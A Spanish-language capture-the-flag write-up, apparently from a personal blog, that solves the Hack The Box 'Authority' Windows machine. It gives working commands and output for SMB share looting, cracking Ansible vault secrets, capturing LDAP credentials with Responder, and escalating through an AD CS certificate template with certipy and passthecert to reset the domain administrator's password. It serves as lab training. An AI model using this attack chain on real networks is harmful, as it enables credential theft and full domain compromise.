---
title: "Authority - Hackthbox"
layout: post
date: 2023-12-20 14:30
tags:
  - Hackthbox
  - Authority
  - SMB enumeration
  - LDAP
  - Responder
  - Ansible
  - Decrypt
  - Certify
  - PassTheCert
image: /assets/images/hackthebox/Authority/Authority.png
headerImage: true
projects: false
hidden: false
description: "Authority - Hackthebox"
category: blog
author: CAHOn3R
externalLink: false
---

# Enumeración

Empezamos el escaneo de puertos con nmap.
```bash
nmap -p- -sS --min-rate 5000 --open -n -Pn -oG allPorts 10.10.11.222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-21 09:25 CET
Nmap scan report for 10.10.11.222
Host is up (0.042s latency).
Not shown: 50553 closed tcp ports (reset), 14957 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
47001/tcp open  winrm
-p- # para escanear los 65535 puertos que existen
-sS # para realizar un escaneo tipo "SYN scan"
--min-rate 5000 # para indicarle no se envien menos de 5k paquetes por segundo
--open # para que solo reporte puertos abiertos
-vvv # para que muestre por consola lo máximo posible y lo antes posible
-n # para realizar un escaneo prescindiendo de la resolución de nombres de dominio
-Pn # para que no realice la detección del estado del host antes de iniciar el escaneo
-oG # para especificar un formato de salida en modo greppable en el archivo allPorts
```
Vemos bastantes puertos abiertos y ya sabemos dos cosas, la primera, que la máquina es Windows, la segunda, que hay muchos caminos por donde ir.

Ya que el puerto **445** está abierto vamos a enumerarlo.
```bash
smbclient -L \\10.10.11.222
Password for [WORKGROUP\cahoner]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Vemos "Department Shares" y "Development", en el primero nos faltan privilegios, así que continuamos la enumeración en "Development".
```bash
smbclient -N \\\\10.10.11.222\\Development
```
Hay un directorio Automation con mucha información dentro, así que procedemos a descargarla toda.

Estando conectados con **smbclient** ejecutamos los siguientes comandos para la descarga.
```bash
mask ""
recurse ON
prompt OFF
mget *
```

En el directorio **PWM** encuentro un archivo con credenciales, las pruebo, pero no funcionan (era evidente), pero ahí las tenemos para el futuro.
```bash
cat ansible_inventory
File: ansible_inventory
   1   │ ansible_user: administrator
   2   │ ansible_password: Welcome1
   3   │ ansible_port: 5985
   4   │ ansible_connection: winrm
   5   │ ansible_winrm_transport: ntlm
   6   │ ansible_winrm_server_cert_validation: ignore
```

Esto es lo que yo suelo hacer para buscar información en muchos ficheros a la vez, y como podréis comprobar suele dar resultado.
```bash
grep -riE 'password'

templates/tomcat-users.xml.j2:<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
templates/tomcat-users.xml.j2:<user username="robot" password="T0mc@tR00t" roles="manager-script"/>
README.md:- pwm_root_mysql_password: root mysql password, will be set to a random value by default.
README.md:- pwm_pwm_mysql_password: pwm mysql password, will be set to a random value by default.
README.md:- pwm_admin_password: pwm admin password, 'password' by default.
defaults/main.yml:pwm_admin_password: !vault |
defaults/main.yml:ldap_admin_password: !vault |
ansible_inventory:ansible_password: Welcome1
```

Filtramos la data y nos quedan estas credenciales:
```bash
username="admin" password="T0mc@tAdm1n"
username="robot" password="T0mc@tR00t"
ansible_password: Welcome1
pwm_admin_password: !vault
ldap_admin_password: !vault
```

Después de enumerar un poco más, vi que en el puerto **8443** había un servicio **HTTPS** corriendo, eche un ojo y efectivamente había un panel de autentificación, probé las credenciales pero ninguna funciono. Lo que me lleva a pensar en los últimos nombres de usuario que sacamos con el `grep -riE`, no tenían password, solo el nombre, fui directo al directorio **defaults**, le hice un `cat main.yml` y ahí estaban las credenciales cifradas en formato **Ansible-vault**, investigando un poquito vi que existe **ansible2john** así que probé eso.

```bash
ansible2john hash
```
Lo tuve que hacer de uno en uno, pero funciono perfectamente, así que los hashes que me devolvió **ansible2john** los trate de romper con **John**.

```bash
john ansible.hash
'!@#$%^&*'
```
Resulto que no íbamos mal encaminados, pero la contraseña que obtuvimos realmente era de la bóveda de **ansible**, no de los propios usuarios, pero bueno, estábamos avanzando.

Creamos un archivo para cada usuario con su hash en el interior.
```bash
nvim pwm_admin_login.yaml
nvim pwm_admin_password.yaml
nvim ldap_admin_password.yaml
```

Y lo desciframos con **ansible-vault**.
```bash
ansible-vault decrypt pwm_admin_password.yaml --output pwm_admin_password.decrypted

ansible-vault decrypt pwm_admin_password.yaml --output pwm_admin_password.decrypted

ansible-vault decrypt pwm_admin_login.yaml --output pwm_admin_login.decrypted
```
Ahí si tenemos credenciales:

```bash
cat *.decrypted
   
   File: ldap_admin_password.decrypted
   DevT3st@123
   
   File: pwm_admin_login.decrypted
   svc_pwm
   
   File: pwm_admin_password.decrypted
   pWm_@dm!N_!23
```

Trate de iniciar sesión nuevamente, pero no me dejaba, me saltaba el siguiente error.
catprura1![[Pasted image 20231221110808.png]]
Sigo probando cosas y veo "Configuration manager", otorgo el pass del **pwm_admin_password** y ahora sí, estamos dentro del panel.
![[captura3 2.png]]

# Explotación

Una vez estamos dentro del panel veo un warning en **ldap**, no se puede conectar al servicio debido a problemas de certificados, entre otras cosas.
![[captura4 1.png]]
Me descargo la configuración para ver que está pasando y vemos lo siguiente.
```html
<setting key="ldap.serverUrls" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING_ARRAY" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</label>
            <value>ldaps://authority.authority.htb:636</value>

```
Intenta conectarse a una dirección que no existe, busco la manera de hacer que se conecte a un servidor ldap nuestro.

```bash
responder -I tun0 -v
```
El servidor **LDAP** nos lo monta en el puerto **389**, así que ahí tratamos de apuntar desde la web, primero nos vamos al **editor**, una vez en el editor, nos dirigimos a:
**LDAP -> LDAP Directories -> default -> Connection**.

![[captura5.png]]
Aquí cambiamos la dirección por la nuestra, quintándole la "s" de **Secure** a la conexión **LDAP** para que se pueda conectar a nuestro responder y ver si viajan credenciales en esa petición.

Por último le damos a "Test LDAP Profile" y esperamos en el **responder**.
![[captura6.png]]
Tenemos usuario: svc_ldap y contraseña: lDaP_1n_th3_cle4r!, probamos a conectarnos con **Evil-winrm** por el puerto **5985** y para dentro, vamos al directorio **Desktop** y ahí tenemos el flag de bajos privilegios.

# PrivEsc

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Tenemos el privilegio de poder agregar Equipos al dominio utilizando credenciales válidas, y tenemos las de **svc_ldap**.

Tras una vuelta por los directorios de la máquina y no encontrar mucha cosa, veo un directorio **Certs** en **C:\\** lo  cual es poco común, así que pienso que la escalada puede ir por ahí...

Me traigo el **certify.exe** de la siguiente forma:
```powershell
PS C:\Users\svc_ldap\Desktop> upload /ruta/del/archivo/certify.exe
```

Y lanzo el siguiente comando para buscar vulnerabilidades.
```powershell
PS C:\Users\svc_ldap\Desktop> ./Certify.exe find /vulnerable
```
![[captura8.png]]
Aquí podéis ver que está pasando realmente [Hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)

Desde nuestra máquina de atacante con la herramienta **impacket-addcomputer** podemos añadir un nuevo equipo en la máquina víctima gracias al permiso **SeMachineAccountPrivilege**, para posteriormente Solicitar un certificado para suplantar al usuario **Administrador**.
![[captura7.png]]

Solicitud de certificado con **certypy**:
```bash
certipy req -username "CAHOn3R$" -p "cahoner123" -dc-ip 10.10.11.222 -ca AUTHORITY-CA -upn 'administrator@authority.htb' -template CorpVPN -debug

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Ahora tenemos que extraer la clave privada y el certificado del archivo administrator.pfx, una vez hecho esto con la herramienta que os comparto por aquí: [passthecert.py](https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py) ya podemos ejecutar comandos, así que procedemos a cambiarle la contraseña al usuario administrator.

Extraer certificado:
```bash
certipy cert -pfx administrator.pfx -nokey -out user.crt
```

Extraer Clave privada:
```bash
certipy cert -pfx administrator.pfx -nocert -out user.key
```

Cambiar el password de usuario Administrator:
```bash
> python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 -domain authority.htb -action modify_user -target administrator -new-pass cahoner123
```

Conectarnos como Administrator en la máquina víctima:
```bash
❯ evil-winrm -i 10.10.11.222 -u 'administrator' -p 'cahoner123'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
htb\administrator
```

¡Ya podemos leer el flag del usuario root!
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
9982bf9ef......a3c65de58
```
